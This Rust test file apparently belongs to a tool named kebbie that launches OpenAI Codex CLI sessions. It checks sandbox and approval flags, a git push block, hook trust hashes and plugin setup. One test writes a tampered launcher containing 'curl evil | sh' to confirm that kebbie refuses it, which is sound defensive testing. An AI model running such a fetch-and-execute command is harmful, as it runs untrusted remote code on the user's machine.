        let unsandboxed = start_args(None, &profile(None, None), &files(false, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
        let sandboxed = start_args(None, &profile(None, None), &files(true, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
        let table = |value: &str| format!("writable_roots = {}\nnetwork_access = true", value);
        toml::from_str::<SandboxWorkspaceWrite>(&table(value_of(&unsandboxed, "sandbox_workspace_write.writable_roots")[0])).unwrap();
        let profile: PermissionProfile = toml_value(value_of(&sandboxed, "permissions.kebbie-task")[0]).try_into().unwrap();
        for (path, access) in profile.filesystem.unwrap() {
            assert!(path.starts_with('/') || path.starts_with("~/") || path.starts_with(':'), "Codex refuses {path}: absolute, ~/ or :special only");
            assert!(access.as_str().is_some_and(|access| ["read", "write", "deny"].contains(&access)) || access.is_table(), "{path}: {access:?}");
        }
    }

    #[test]
    fn a_codex_task_carries_its_sandbox_once_through_start_resume_and_role() {
        for sandboxed in [true, false] {
            let started = start_args(None, &profile(None, None), &files(sandboxed, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
            let argv: Vec<String> = std::iter::once("codex".to_string()).chain(started.iter().cloned()).collect();
            let resumed = with_role(&crate::agent::Agent::Codex.resume_args(&argv, "019b3136").unwrap());
            let restarted = start_args(None, &profile(None, None), &files(sandboxed, Some(Path::new(TMP)), &[]), &Session::Resume("019b3136".to_string()));
            for args in [&started, &resumed, &restarted] {
                let count = |key: &str| value_of(args, key).len();
                let keys = if sandboxed { ["default_permissions", "permissions.kebbie-task"] } else { ["sandbox_workspace_write.writable_roots", "sandbox_workspace_write.network_access"] };
                for key in keys {
                    assert_eq!(count(key), 1, "{key} once: {args:?}");
                }
            }
        }
    }

    #[test]
    fn a_codex_tasks_git_dirs_take_its_commit_while_the_push_block_stays_read_only_and_refuses_its_push() {
        let base = crate::sh::test_dir("codex-git-dirs");
        let (main, slot, origin, state) = (base.join("app"), base.join("wt1.app"), base.join("origin.git"), base.join("state"));
        std::fs::create_dir_all(&main).unwrap();
        let git = |dir: &Path, args: &[&str]| crate::repo::git(dir, args).unwrap();
        git(&main, &["init", "--quiet", "--initial-branch=main"]);
        git(&main, &["-c", "user.name=Ada", "-c", "user.email=ada@example.com", "commit", "--quiet", "--allow-empty", "-m", "a"]);
        git(&base, &["init", "--quiet", "--bare", &origin.to_string_lossy()]);
        git(&main, &["remote", "add", "origin", "https://example.invalid/app.git"]);
        git(&main, &["worktree", "add", "--quiet", "-b", "billing", &slot.to_string_lossy()]);
        assert_eq!(crate::push_block::install(&slot, &state).unwrap(), crate::push_block::Block::On);
        let git_dir = PathBuf::from(git(&slot, &["rev-parse", "--absolute-git-dir"]));
        let (writes, kept) = (commit_roots(Some(&git_dir)), git_run_as_user(Some(&git_dir)));
        let read_only = |path: &Path| kept.iter().any(|entry| path.starts_with(entry));
        let writable = |path: &Path| !read_only(path) && writes.iter().any(|root| path.starts_with(root));
        for written in ["index", "HEAD", "logs/HEAD", "ORIG_HEAD"] {
            assert!(writable(&PathBuf::from(git(&slot, &["rev-parse", "--absolute-git-dir"])).join(written)), "{written}");
        }
        for written in ["refs/heads/billing", "logs/refs/heads/billing", "objects/ab", "refs/stash"] {
            let path = PathBuf::from(git(&slot, &["rev-parse", "--path-format=absolute", "--git-path", written]));
            assert!(writable(&path), "a commit writes {}", path.display());
        }
        let hooks = PathBuf::from(git(&slot, &["config", "--worktree", "core.hooksPath"]));
        let worktree_config = PathBuf::from(git(&slot, &["rev-parse", "--path-format=absolute", "--git-path", "config.worktree"]));
        let common_config = PathBuf::from(git(&slot, &["rev-parse", "--path-format=absolute", "--git-common-dir"])).join("config");
        for block in [&hooks.join("pre-push"), &worktree_config, &common_config] {
            assert!(read_only(block) && !writable(block), "the push block's {} stays read-only to the task", block.display());
        }
        let env = crate::push_block::env_vars(true);
        let output = std::process::Command::new("git").args(["push", "--no-verify", "origin", "HEAD:main"]).current_dir(&slot).env_remove(crate::push_block::TOKEN_VAR).envs(env.iter().map(|(name, value)| (name, value))).output().unwrap();
        assert!(!output.status.success() && String::from_utf8_lossy(&output.stderr).contains("kebbie-blocks-push"), "{}", String::from_utf8_lossy(&output.stderr));
        let hooked = std::process::Command::new("git").args(["push", &origin.to_string_lossy(), "HEAD:main"]).current_dir(&slot).env_remove(crate::push_block::TOKEN_VAR).envs(env.iter().map(|(name, value)| (name, value))).output().unwrap();
        assert!(!hooked.status.success(), "the pre-push hook still refuses a local push");
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn the_permission_mode_maps_to_codexs_approvals_inside_and_outside_its_sandbox() {
        let run = |mode: Option<&str>, sandboxed: bool| access(mode, sandboxed).join(" ");
        assert_eq!(run(Some("bypassPermissions"), true), "--ask-for-approval never", "nothing leaves the sandbox, as Claude's allowUnsandboxedCommands = false");
        assert_eq!(run(Some("dontAsk"), true), "--ask-for-approval never");
        assert_eq!(run(Some("auto"), true), "--ask-for-approval on-request -c approvals_reviewer=\"auto_review\"", "only auto lets Codex's own reviewer approve a step out of the sandbox");
        assert_eq!(run(None, true), "--ask-for-approval on-request");
        assert_eq!(run(Some("default"), true), run(None, true));
        assert_eq!(run(Some("acceptEdits"), true), "--ask-for-approval on-request");
        assert_eq!(run(Some("plan"), true), "--sandbox read-only --ask-for-approval on-request");
        assert_eq!(run(Some("plan"), false), "--sandbox read-only --ask-for-approval on-request");
        assert_eq!(run(Some("bypassPermissions"), false), "--dangerously-bypass-approvals-and-sandbox", "only with the sandbox turned off");
        assert_eq!(run(Some("dontAsk"), false), "--ask-for-approval never");
        assert_eq!(run(Some("auto"), false), run(Some("auto"), true));
        assert_eq!(run(None, false), "", "the user's own Codex config decides");
    }

    #[test]
    fn a_resumed_codex_task_names_its_session_last_after_the_resume_subcommand() {
        let args = start_args(Some("default"), &profile(None, None), &files(true, None, &[]), &Session::Resume("019b3136-fdf0-7d50-8762-84076af7f203".to_string()));
        assert_eq!(args.first().map(String::as_str), Some("resume"));
        assert_eq!(args.last().map(String::as_str), Some("019b3136-fdf0-7d50-8762-84076af7f203"));
        assert!(!args.iter().any(|word| word.starts_with("model_reasoning_effort") || word == "--model"), "no model or effort the profile did not name");
    }

    #[test]
    fn the_hash_kebbie_trusts_is_codexs_own_for_each_hook() {
        let rows: Value = serde_json::from_str(r#"{"nested":{"a":true,"z":"text"},"rows":[{"a":1,"z":2},{"a":3,"z":4}]}"#).unwrap();
        assert_eq!(sha256_version(&rows), "sha256:a5e4c8fbdbc75d185b0f2b5291bfb2de10e8c523d6c89248876fd78a97c83176", "codex-rs/config/src/fingerprint_tests.rs at rust-v0.163.0");
        let file: Value = serde_json::from_str(&hooks_json()).unwrap();
        for hook in &HOOKS {
            let written = &file["hooks"][hook.event][0]["hooks"][0];
            assert_eq!(written, &handler(hook), "{}", hook.event);
        }
        assert_eq!(file["hooks"]["SessionStart"][0]["hooks"][0]["additionalContextLimit"], json!(0), "a long role is passed whole");
        assert_eq!(hook_key(&HOOKS[2]), "kebbie@kebbie-tasks:hooks/hooks.json:stop:0:0");
        let reported = ["sha256:295a39bbc9d240f43c3f0b9de092ff1e0b435dc36629e69ea10b3316f3b6163d", "sha256:7a7859ef4dc3adbcfaf3e02b025e11999a6850fdd9c76dffd746561da574a189", "sha256:d777eb217913a82b5591d44ce47b1653542e40ad4164479c2c427d6ca93f3482", "sha256:8c65d9d34b88bdcaa4734912f941ba16c0a7e9c3f9947e51901789de58354c28"];
        assert_eq!(HOOKS.iter().map(hook_hash).collect::<Vec<_>>(), reported, "the currentHash codex app-server reports in hooks/list for these hooks (0.163.0, pre_tool_use 0.166.0, the part before the / that joins the plugin's content hash); a change to a hook changes it, and kebbie's override with it");
        assert!(trust_override().starts_with("hooks.state={\"kebbie@kebbie-tasks:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:"));
        let parsed: toml::Table = trust_override().replacen("hooks.state=", "state = ", 1).parse().unwrap();
        assert_eq!(parsed["state"].as_table().unwrap().len(), 4, "the override parses as TOML with all four entries");
    }

    #[test]
    fn the_hooks_file_never_changes_with_kebbies_path_so_its_trust_holds_across_updates() {
        assert_eq!(hooks_json(), hooks_json());
        let file: Value = serde_json::from_str(&hooks_json()).unwrap();
        assert_eq!(file["hooks"]["Stop"][0]["hooks"][0]["command"], "\"${PLUGIN_ROOT}/bin/kebbie-hook\" stop", "the launcher in the plugin, which knows where kebbie is");
        assert!(launcher("/opt/kebbie/kebbie").contains("kebbie='/opt/kebbie/kebbie'\n[ -x \"$kebbie\" ] || exit 0\nexec \"$kebbie\" hook codex \"$@\""));
    }

    #[test]
    fn kebbie_trusts_its_plugins_files_by_the_hash_codex_takes_of_them() {
        let home = crate::sh::test_dir("codex-content");
        install(&home, "/opt/kebbie").unwrap();
        let root = plugin_root(&home);
        let content = content_hash(&root).unwrap();
        assert_eq!(content, "sha256:30c4b10e7f3e14aa4bf668d2c709ccbf76ca7af77db0e89f0293b40f8a05d891", "the part after the / of the currentHash codex app-server 0.166.0 reports in hooks/list for this plugin, installed for /opt/kebbie");
        let parsed: toml::Table = trust_entries(Some(&content)).replacen("hooks.state=", "state = ", 1).parse().unwrap();
        let state = parsed["state"].as_table().unwrap();
        assert_eq!(state.len(), HOOKS.len());
        for hook in &HOOKS {
            let entry = &state[&hook_key(hook)];
            assert_eq!((entry["trusted_hash"].as_str(), entry["trusted_content_hash"].as_str()), (Some(hook_hash(hook).as_str()), Some(content.as_str())), "without the content hash Codex 0.166 judges {} against a .hook-trust baseline that an earlier plugin left", hook.label);
        }
        std::fs::write(root.join("bin/.DS_Store"), "x").unwrap();
        assert_ne!(content_hash(&root).unwrap(), content, "Codex hashes every entry under the plugin, not only the files kebbie writes");
        assert!(!trust_entries(None).contains("trusted_content_hash"), "a plugin kebbie cannot read is trusted by declaration alone");
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn setup_writes_kebbies_plugin_into_codexs_cache_once_and_never_the_users_own_files() {
        let home = crate::sh::test_dir("codex-home");
        std::fs::write(home.join("config.toml"), "model = \"gpt-5.5\"\n").unwrap();
        std::fs::write(home.join("hooks.json"), "{\"hooks\":{}}").unwrap();
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Missing);
        let written = install(&home, "/opt/kebbie").unwrap();
        let root = home.join("plugins/cache/kebbie-tasks/kebbie/local");
        assert_eq!(written, [".codex-plugin/plugin.json", "hooks/hooks.json", "bin/kebbie-hook"]);
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(root.join("bin/kebbie-hook")).unwrap().permissions().mode() & 0o777, 0o755);
        assert_eq!(serde_json::from_str::<Value>(&std::fs::read_to_string(root.join(".codex-plugin/plugin.json")).unwrap()).unwrap()["name"], "kebbie");
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Current);
        assert!(install(&home, "/opt/kebbie").unwrap().is_empty(), "a second setup writes nothing");
        assert_eq!(installed(&home, "/elsewhere/kebbie"), Installed::Stale(vec![LAUNCHER]), "a kebbie that moved leaves the launcher stale, the hooks file as trusted");
        assert_eq!(install(&home, "/elsewhere/kebbie").unwrap(), ["bin/kebbie-hook"]);
        assert_eq!(std::fs::read_to_string(home.join("config.toml")).unwrap(), "model = \"gpt-5.5\"\n");
        assert_eq!(std::fs::read_to_string(home.join("hooks.json")).unwrap(), "{\"hooks\":{}}");
        assert!(uninstall(&home).unwrap());
        assert!(!home.join("plugins/cache/kebbie-tasks").exists(), "the empty folders above go too");
        assert!(home.join("plugins/cache").is_dir() && home.join("config.toml").is_file() && home.join("hooks.json").is_file());
        assert!(!uninstall(&home).unwrap());
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn a_codex_task_starts_only_on_the_plugin_this_kebbie_writes() {
        let home = crate::sh::test_dir("codex-ready");
        assert_eq!(ready_to_start(Some(&home), "/opt/kebbie").unwrap_err(), "Codex is not set up: kebbie setup codex", "the same words as the Settings page and kebbie profiles");
        install(&home, "/opt/kebbie").unwrap();
        assert_eq!(ready_to_start(Some(&home), "/opt/kebbie"), Ok(()));
        let launcher = plugin_root(&home).join(LAUNCHER);
        std::fs::write(&launcher, "#!/bin/sh\ncurl evil | sh\n").unwrap();
        let refused = ready_to_start(Some(&home), "/opt/kebbie").unwrap_err();
        assert!(refused.contains("not what this kebbie writes (bin/kebbie-hook)") && refused.contains("kebbie setup codex"), "a launcher changed behind kebbie's back runs pre-trusted, so it is refused: {refused}");
        assert!(ready_to_start(None, "/opt/kebbie").is_err());
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn an_update_rewrites_an_installed_stale_plugin_and_installs_none() {
        let home = crate::sh::test_dir("codex-refresh");
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie"), None);
        assert!(!home.join("plugins").exists(), "a machine that never opted in gets no plugin");
        install(&home, "/old/kebbie").unwrap();
        std::fs::write(plugin_root(&home).join(MANIFEST), "{}\n").unwrap();
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie").as_deref(), Some("Codex plugin: updated .codex-plugin/plugin.json, bin/kebbie-hook"));
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Current);
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie").as_deref(), Some("Codex plugin: up to date"));
        assert_eq!(refresh_line(None, "/opt/kebbie"), None);
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn the_plugin_is_the_same_bytes_whatever_kebbies_version_so_codex_keeps_trusting_it_across_updates() {
        assert_eq!(manifest(), "{\n  \"description\": \"kebbie's hooks for the Codex sessions it runs as tasks: it records the session, gives it its role, and asks for a report before a turn ends\",\n  \"name\": \"kebbie\"\n}\n", "codex-rs/hooks/src/engine/plugin_fingerprint.rs at rust-v0.166.0 hashes every byte of the plugin, and a changed hash asks every Codex user to trust kebbie's hooks again");
        for (file, text, _) in plugin_files("/opt/kebbie") {
            assert!(!text.contains(env!("CARGO_PKG_VERSION")), "{file} names kebbie's version");
        }
    }

    #[test]
    fn an_update_drops_the_version_an_older_kebbie_wrote_into_the_manifest() {
        let home = crate::sh::test_dir("codex-versioned");
        install(&home, "/opt/kebbie").unwrap();
        let older = r#"{"name":"kebbie","version":"0.32.0","description":"kebbie's hooks for the Codex sessions it runs as tasks: it records the session, gives it its role, and asks for a report before a turn ends"}"#;
        std::fs::write(plugin_root(&home).join(MANIFEST), older).unwrap();
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Stale(vec![MANIFEST]));
        assert!(ready_to_start(Some(&home), "/opt/kebbie").is_err());
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie").as_deref(), Some("Codex plugin: updated .codex-plugin/plugin.json"));
        assert!(serde_json::from_str::<Value>(&std::fs::read_to_string(plugin_root(&home).join(MANIFEST)).unwrap()).unwrap().get("version").is_none());
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie").as_deref(), Some("Codex plugin: up to date"), "rewritten once, then left alone");
        std::fs::remove_dir_all(home).unwrap();
    }

    fn write(path: &Path, text: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    #[test]
    fn kebbies_plugin_id_is_not_the_name_of_kebbies_own_claude_marketplace() {
        let marketplace: Value = serde_json::from_str(include_str!("../../.claude-plugin/marketplace.json")).unwrap();
        assert_ne!(marketplace["name"], MARKETPLACE, "codex-rs/core-plugins/src/loader.rs at rust-v0.163.0 reinstalls an enabled plugin from a marketplace of the same name in the session's repo, and store.rs then removes local");
        assert_eq!(PLUGIN_ID, format!("{NAME}@{MARKETPLACE}"));
        let repo = crate::sh::test_dir("codex-shadow");
        assert_eq!(shadowed_in(&repo), None);
        write(&repo.join(".claude-plugin/marketplace.json"), include_str!("../../.claude-plugin/marketplace.json"));
        assert_eq!(shadowed_in(&repo), None, "kebbie's own repo does not shadow it");
        write(&repo.join(".agents/plugins/marketplace.json"), r#"{"name":"kebbie-tasks","plugins":[{"name":"kebbie","source":{"source":"local","path":"./x"}}]}"#);
        assert_eq!(shadowed_in(&repo), Some(repo.join(".agents/plugins/marketplace.json")));
        std::fs::remove_dir_all(repo).unwrap();
    }

    #[test]
    fn a_copy_codex_installed_in_place_of_kebbies_plugin_is_named_and_setup_puts_kebbies_back() {
        let home = crate::sh::test_dir("codex-replaced");
        install(&home, "/opt/kebbie").unwrap();
        std::fs::remove_dir_all(plugin_root(&home)).unwrap();
        write(&plugin_base(&home, MARKETPLACE).join("0.30.0/build.rs"), "fn main() {}\n");
        let copy = plugin_base(&home, MARKETPLACE).join("0.30.0");
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Replaced(vec![copy.clone()]));
        let refused = ready_to_start(Some(&home), "/opt/kebbie").unwrap_err();
        assert!(refused.contains("Codex replaced kebbie's plugin with") && refused.contains("0.30.0") && refused.contains("kebbie setup codex"), "{refused}");
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie").as_deref(), Some("Codex plugin: updated .codex-plugin/plugin.json, hooks/hooks.json, bin/kebbie-hook"));
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Current, "local wins over the copy beside it");
        assert_eq!(foreign_copies(&home, MARKETPLACE), [copy]);
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn kebbies_plugin_under_kebbie_at_kebbie_moves_to_kebbie_tasks_and_a_copy_codex_made_there_stays_for_doctor() {
        let home = crate::sh::test_dir("codex-old-id");
        let old = home.join("plugins/cache/kebbie/kebbie/local");
        for (file, text, _) in plugin_files("/opt/kebbie") {
            write(&old.join(file), &text);
        }
        assert_eq!(installed(&home, "/opt/kebbie"), Installed::UnderOldId(old.clone()), "a machine with kebbie's plugin under kebbie@kebbie has opted in");
        assert!(ready_to_start(Some(&home), "/opt/kebbie").unwrap_err().contains("under the id kebbie@kebbie, which a repo's marketplace replaces; run kebbie setup codex"));
        assert_eq!(refresh_line(Some(&home), "/opt/kebbie").as_deref(), Some("Codex plugin: updated .codex-plugin/plugin.json, hooks/hooks.json, bin/kebbie-hook"), "an update moves an opted-in plugin to kebbie@kebbie-tasks");
        assert!(!home.join("plugins/cache/kebbie").exists() && installed(&home, "/opt/kebbie") == Installed::Current);
        write(&home.join("plugins/cache/kebbie/kebbie/0.30.0/src/main.rs"), "fn main() {}\n");
        install(&home, "/opt/kebbie").unwrap();
        assert_eq!(old_copies(&home), [home.join("plugins/cache/kebbie/kebbie/0.30.0")], "a copy kebbie did not write is never removed");
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn uninstall_keeps_other_plugins_from_the_same_cache() {
        let home = crate::sh::test_dir("codex-uninstall");
        install(&home, "/opt/kebbie").unwrap();
        std::fs::create_dir_all(home.join("plugins/cache/kebbie-tasks/other/local")).unwrap();
        uninstall(&home).unwrap();
        assert!(home.join("plugins/cache/kebbie-tasks/other/local").is_dir() && !home.join("plugins/cache/kebbie-tasks/kebbie").exists());
        std::fs::remove_dir_all(home).unwrap();
    }

    const ROLLOUT: &str = concat!(
        r#"{"timestamp":"2026-10-22T09:15:02.101Z","type":"session_meta","payload":{"id":"019b3136-fdf0-7d50-8762-84076af7f203","timestamp":"2026-10-22T09:15:02.090Z","cwd":"/src/wt1.app","originator":"codex_cli_rs","cli_version":"0.163.0","source":"cli","model_provider":"openai"}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:15:02.200Z","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"<environment_context>\n  <cwd>/src/wt1.app</cwd>\n</environment_context>"}]}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:15:03.000Z","type":"event_msg","payload":{"type":"user_message","message":"add refunds to the billing page","images":[]}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:15:09.500Z","type":"event_msg","payload":{"type":"agent_message","message":"Done."}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:16:00.000Z","type":"event_msg","payload":{"type":"item_completed","thread_id":"019b3136-fdf0-7d50-8762-84076af7f203","turn_id":"t2","item":{"type":"UserMessage","id":"u2","content":[{"type":"text","text":"[from lead] rebase first","text_elements":[]}]}}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:16:30.000Z","type":"event_msg","payload":{"type":"item_completed","thread_id":"019b3136-fdf0-7d50-8762-84076af7f203","turn_id":"t2","item":{"type":"HookPrompt","id":"h1","fragments":[{"text":"Before you stop, report","hookRunId":"r"}]}}}"#, "\n",
        "not json\n",
    );

    #[test]
    fn the_user_turns_of_a_rollout_are_its_user_message_events_and_never_codexs_own_context() {
        let said = user_messages_at(ROLLOUT);
        assert_eq!(said, [(crate::typing::iso_millis("2026-10-22T09:15:03.000Z"), "add refunds to the billing page".to_string()), (crate::typing::iso_millis("2026-10-22T09:16:00.000Z"), "[from lead] rebase first".to_string())]);
        assert!(said.iter().all(|(at, _)| at.is_some()));
    }

    #[test]
    fn a_session_is_found_by_its_id_and_a_folders_latest_by_the_cwd_its_rollout_opens_with() {
        let home = crate::sh::test_dir("codex-rollouts");
        let day = home.join("sessions/2026/10/22");
        std::fs::create_dir_all(&day).unwrap();
        let file = day.join("rollout-2026-10-22T11-15-02-019b3136-fdf0-7d50-8762-84076af7f203.jsonl");
        std::fs::write(&file, ROLLOUT).unwrap();
        std::fs::write(day.join("rollout-2026-10-22T11-20-00-019b3137-0000-7000-8000-000000000000.jsonl"), ROLLOUT.replace("/src/wt1.app", "/src/wt2.app").replace("019b3136-fdf0-7d50-8762-84076af7f203", "019b3137-0000-7000-8000-000000000000")).unwrap();
        assert_eq!(transcript(&home, "019b3136-fdf0-7d50-8762-84076af7f203"), Some(file.clone()));
        assert_eq!(transcript(&home, "019b3136"), None, "only a whole id matches");
        let packed = day.join("rollout-2026-10-01T08-00-00-019b0000-0000-7000-8000-000000000001.jsonl.zst");
        std::fs::write(&packed, [0x28, 0xb5, 0x2f, 0xfd]).unwrap();
        assert_eq!(transcript(&home, "019b0000-0000-7000-8000-000000000001"), Some(packed.clone()), "a compressed session is still found, so it is resumed");
        assert!(compressed(&packed) && !compressed(&file));
        let epoch = std::time::UNIX_EPOCH;
        assert_eq!(latest_session(&home, Path::new("/src/wt1.app"), epoch).as_deref(), Some("019b3136-fdf0-7d50-8762-84076af7f203"));
        assert_eq!(latest_session(&home, Path::new("/src/wt3.app"), epoch), None);
        assert_eq!(latest_session(&home, Path::new("/src/wt1.app"), std::time::SystemTime::now() + std::time::Duration::from_secs(60)), None, "a conversation from before the task's branch is not the task's");
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn codexs_composer_is_read_as_empty_typed_or_unreadable() {
        let empty = "\n\x1b[1m›\x1b[22m \x1b[2mAsk Codex to do anything\x1b[22m\n\n  ? for shortcuts                       100% context left";
        assert_eq!(draft(empty), Draft::Empty, "the placeholder Codex 0.163 draws dim");
        let typed = "› add refunds\n\n  done\n\x1b[1m›\x1b[22m fix the flaky test\n  in billing\n\n                                 100% context left";
        assert_eq!(draft(typed), Draft::Typed("fix the flaky test\nin billing".to_string()), "the last prompt line is the composer; one above is history");
        assert_eq!(draft("› [Pasted Content 1005 chars]\n\n  100% context left"), Draft::Typed("[Pasted Content 1005 chars]".to_string()));
        assert_eq!(draft("› \n\n  100% context left"), Draft::Empty);
        assert_eq!(draft("Working (12s · esc to interrupt)"), Draft::Unreadable);
        assert_eq!(draft("› Ask Codex to do anything\n\n  100% context left"), Draft::Empty, "the placeholder read without its styling");
        assert_eq!(draft("\x1b[2m›\x1b[22m \x1b[2mInput disabled.\x1b[22m\n\n  100% context left"), Draft::Unreadable, "a disabled composer takes nothing");
        assert_eq!(draft("\x1b[1m›\x1b[22m \x1b[2mcheck instead what is wrong with latest deployment\x1b[22m\n\n  100% context left"), Draft::Unreadable, "faint text that is not Codex's placeholder is never taken for an empty box, so a prompt is never glued onto it");
    }

    #[test]
    fn a_folder_counts_as_trusted_when_codexs_config_trusts_it_or_a_folder_above() {
        let config: toml::Table = "[projects.\"/home/ada/code\"]\ntrust_level = \"trusted\"\n[projects.\"/home/ada/other\"]\ntrust_level = \"untrusted\"\n".parse().unwrap();
        assert!(trusted_in(&config, Path::new("/home/ada/code/shop")));
        assert!(!trusted_in(&config, Path::new("/home/ada/other/shop")));
        assert!(!trusted_in(&toml::Table::new(), Path::new("/home/ada/code")));
        let screen = "  Trust this folder? Codex can read, edit, and run files here,\n› 1. Trust and continue\n  2. Quit";
        assert!(asks_trust(screen) && trust_selected(screen));
        assert!(!trust_selected("  1. Trust and continue\n› 2. Quit"));
        let hooks = "  Hooks need review\n  2 hooks are new or changed.\n› 1. Review hooks\n  2. Trust all and continue\n  3. Continue without trusting (hooks\n     won't run)";
        assert_eq!((SCREENS.held)(hooks), Some(Started::AwaitsHooks), "Codex 0.163's startup review of the user's own hooks is left to the user");
        assert_eq!((SCREENS.held)(screen), None);
        assert_eq!(Started::AwaitsHooks.asks(), Some("whether to trust the hooks it found new or changed"));
    }

    const WELCOME: &str = "  Welcome to Codex, OpenAI's command-line coding agent\n\n  Choose how you want to use Codex.\n\n› 1. Sign in with ChatGPT\n     Usage included with Plus, Pro, Business, and Enterprise plans\n\n  2. Sign in with Device Code\n\n  Press enter to continue";
    const SIGNED_IN: &str = "✓ Signed in with your ChatGPT account\n\n  You're in control\n\n  Press enter to continue";
    const UPGRADE: &str = "  Codex just got an upgrade. Introducing\n  gpt-5.1-codex-max.\n\n› 1. Try new model\n  2. Use existing model\n\n  enter/esc confirm · ⌃c quit";

    #[test]
    fn codexs_welcome_sign_in_and_model_screens_hold_the_start_and_say_what_codex_asks() {
        assert_eq!((SCREENS.held)(WELCOME), Some(Started::AwaitsSignIn), "codex-rs/tui/src/onboarding/welcome.rs and auth.rs at rust-v0.163.0");
        assert_eq!((SCREENS.held)(SIGNED_IN), Some(Started::AwaitsSignIn));
        assert_eq!((SCREENS.held)(UPGRADE), Some(Started::AwaitsModel), "model_migration.rs");
        assert_eq!((SCREENS.held)("  Trust this folder? Codex can read\n› 1. Trust and continue\n  2. Quit"), None, "the trust prompt is answered for a trusted folder, so it is not held here");
        assert_eq!(startup_question("  Trust this folder? Codex can read\n› 1. Trust and continue\n  2. Quit"), Some(Started::AwaitsTrust));
        assert_eq!(startup_question("› Ask Codex to do anything\n\n  100% context left"), None);
        assert_eq!(Started::AwaitsSignIn.asks(), Some("you to sign in"));
        assert!(matches!(draft(WELCOME), Draft::Typed(_)), "a welcome screen is never an empty composer to type into");
    }

    const UPDATE: &str = "\n  Update available · 0.163.0 → 0.164.0\n  Release notes: https://github.com/openai/codex/releases/latest\n\n› 1. Update now (runs `npm install -g @openai/codex`)\n  2. Skip\n  3. Skip until next version\n\n  enter continue · esc skip";

    #[test]
    fn a_codex_kebbie_starts_skips_its_update_check_and_its_update_screen_holds_the_start() {
        for session in [Session::New("x".to_string()), Session::Resume("id".to_string())] {
            let args = start_args(None, &profile(None, None), &files(true, None, &[]), &session);
            assert!(after(&args, "-c").contains(&"check_for_update_on_startup=false"), "codex-rs/tui/src/updates.rs reads config.check_for_update_on_startup before it shows tui/src/update_prompt.rs: {args:?}");
        }
        let resumed = with_role(&crate::agent::Agent::Codex.resume_args(&["codex".to_string(), "-c".to_string(), NO_UPDATE_CHECK.to_string()], "id").unwrap());
        assert_eq!(resumed.iter().filter(|word| *word == NO_UPDATE_CHECK).count(), 1, "a restart keeps the check off once: {resumed:?}");
        assert_eq!((SCREENS.held)(UPDATE), Some(Started::AwaitsUpdate), "a Codex that checks anyway, as under a managed config, holds the start on tui/src/update_prompt.rs");
        assert_eq!(startup_question(UPDATE), Some(Started::AwaitsUpdate));
        assert_eq!(Started::AwaitsUpdate.asks(), Some("whether to update it first"));
    }

    const HOOKS_REVIEW: &str = "  Hooks need review\n  1 hook is new or changed.\n› 1. Review hooks\n  2. Trust all and continue\n  3. Continue without trusting (hooks won't run)";

    #[test]
    fn a_codex_herdr_calls_idle_on_a_start_up_question_counts_as_blocked_with_what_it_asks() {
        let read = std::cell::RefCell::new(Vec::new());
        let mark = |agent: Value, screen: &str| with_question(agent, || true, |pane| { read.borrow_mut().push(pane.to_string()); Some(screen.to_string()) });
        let marked = mark(json!({ "agent": "codex", "pane_id": "w1:p1", "agent_status": "idle" }), HOOKS_REVIEW);
        assert_eq!((marked["agent_status"].as_str(), marked[ASKS_KEY].as_str()), (Some("blocked"), Some("whether to trust the hooks it found new or changed")));
        let composer = mark(json!({ "agent": "codex", "pane_id": "w2:p1", "agent_status": "idle" }), "› Ask Codex to do anything");
        assert_eq!((composer["agent_status"].as_str(), composer.get(ASKS_KEY)), (Some("idle"), None), "a composer asks nothing");
        mark(json!({ "agent": "codex", "pane_id": "w3:p1", "agent_status": "working" }), HOOKS_REVIEW);
        mark(json!({ "agent": "claude", "pane_id": "w4:p1", "agent_status": "idle" }), HOOKS_REVIEW);
        assert_eq!(read.into_inner(), ["w1:p1", "w2:p1"], "a working Codex and a Claude are never read");
    }

    #[test]
    fn a_codex_past_its_first_prompt_is_never_read_for_start_up_questions_whatever_its_screen_shows() {
        let past = with_question(json!({ "agent": "codex", "pane_id": "w1:p1", "agent_status": "idle" }), || false, |_| panic!("a Codex past its first prompt has no screen read for start-up questions"));
        assert_eq!((past["agent_status"].as_str(), past.get(ASKS_KEY)), (Some("idle"), None), "a task working in kebbie's own repo shows these words in codex.rs or a diff, which is no question of Codex's");
    }

    #[test]
    fn a_codex_titled_action_required_waits_on_an_approval_at_any_point_in_its_session() {
        for title in ["[ ! ] Action Required | Fix the flaky checkout test | wt1.app", "[ . ] Action Required | Fix the flaky checkout test | wt1.app", "● [ ! ] Action Required | wt1.app"] {
            let agent = with_question(json!({ "agent": "codex", "pane_id": "w1:p1", "agent_status": "idle", "terminal_title": title }), || panic!("the title says it, whatever the prompt"), |_| panic!("the title says it, without a read of the screen"));
